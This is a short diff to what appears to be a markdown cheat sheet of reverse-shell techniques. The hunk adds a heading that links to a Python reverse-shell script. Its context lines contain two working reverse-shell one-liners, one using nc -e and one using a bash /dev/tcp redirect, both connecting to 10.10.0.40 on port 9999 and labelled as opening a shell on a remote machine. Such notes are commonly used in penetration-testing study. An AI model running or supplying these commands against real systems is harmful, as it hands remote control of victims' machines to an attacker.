@@ -123,6 +123,9 @@ nc -e /bin/bash 10.10.0.40 9999
 /bin/bash -i > /dev/tcp/10.10.0.40/9999 0<&1 2>&1
 ```
 Opening shell on remote machine
+
+### [Python remote_shell script](Socket_Scripts/Reverse_Shell.py)
+
 ## /Dev/TCP
 
 ```
